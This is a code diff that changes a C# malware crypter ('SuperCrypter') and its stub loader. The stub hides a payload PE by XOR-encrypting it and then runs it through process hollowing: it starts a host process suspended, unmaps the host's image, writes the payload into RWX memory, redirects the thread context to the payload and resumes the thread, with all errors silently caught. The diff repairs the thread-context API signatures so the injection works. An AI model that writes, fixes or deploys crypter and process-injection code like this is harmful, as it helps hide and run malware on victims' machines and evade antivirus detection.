@@ -63,7 +63,6 @@ public class SuperCrypter
         return encryptedData;
     }
 
-    // This is a self-inverting XOR encryption. The same function is used for decryption.
     public static byte[] ShiftXorEncrypt(byte[] data, string key, int shift)
     {
         byte[] keyBytes = Encoding.ASCII.GetBytes(key);
@@ -107,11 +106,12 @@ class Stub
     private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
+
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, ref long lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, ref long lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool SetThreadContext(IntPtr hThread, ref long lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64SetThreadContext(IntPtr hThread, ref long lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr lpContext);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);
     [DllImport(""ntdll.dll"", SetLastError = true)] private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -169,10 +169,13 @@ class Stub
         {
             if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception();
             int e_lfanew = BitConverter.ToInt32(payload, 60); int opHeader = e_lfanew + 24; short magic = BitConverter.ToInt16(payload, opHeader);
-            long imageBase, context = 0;
-            if (magic == 0x10b) { context = Marshal.AllocHGlobal(716); Marshal.WriteInt64(context, 0, 0x10002); if (IntPtr.Size == 4) GetThreadContext(pi.hThread, ref context); else Wow64GetThreadContext(pi.hThread, ref context); imageBase = BitConverter.ToInt32(payload, opHeader + 28); }
-            else if (magic == 0x20b) { context = Marshal.AllocHGlobal(1232); Marshal.WriteInt64(context, 0, 0x100002); GetThreadContext(pi.hThread, ref context); imageBase = BitConverter.ToInt64(payload, opHeader + 24); }
+            long imageBase;
+            IntPtr context = IntPtr.Zero;
+
+            if (magic == 0x10b) { context = Marshal.AllocHGlobal(716); Marshal.WriteInt64(context, 0, 0x10002); if (IntPtr.Size == 4) GetThreadContext(pi.hThread, context); else Wow64GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt32(payload, opHeader + 28); }
+            else if (magic == 0x20b) { context = Marshal.AllocHGlobal(1232); Marshal.WriteInt64(context, 0, 0x100002); GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt64(payload, opHeader + 24); }
             else throw new Exception();
+
             NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
             uint sizeOfImage = BitConverter.ToUInt32(payload, opHeader + 56);
             IntPtr newImageBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
@@ -188,8 +191,8 @@ class Stub
                     WriteProcessMemory(pi.hProcess, (IntPtr)(newImageBase.ToInt64() + BitConverter.ToInt32(payload, sectionOffset + 12)), sectionData, sectionData.Length, ref bytesWritten);
                 }
             }
-            if (magic == 0x10b) { long eax = Marshal.ReadInt64(context, 44); WriteProcessMemory(pi.hProcess, (IntPtr)(eax + 8), BitConverter.GetBytes(newImageBase.ToInt64()), 4, ref bytesWritten); Marshal.WriteInt64(context, 32, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); if (IntPtr.Size == 4) SetThreadContext(pi.hThread, ref context); else Wow64SetThreadContext(pi.hThread, ref context); }
-            else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, ref context); }
+            if (magic == 0x10b) { long eax = Marshal.ReadInt64(context, 44); WriteProcessMemory(pi.hProcess, (IntPtr)(eax + 8), BitConverter.GetBytes(newImageBase.ToInt64()), 4, ref bytesWritten); Marshal.WriteInt64(context, 32, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); if (IntPtr.Size == 4) SetThreadContext(pi.hThread, context); else Wow64SetThreadContext(pi.hThread, context); }
+            else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, context); }
             Marshal.FreeHGlobal(context);
             ResumeThread(pi.hThread);
         } catch {}
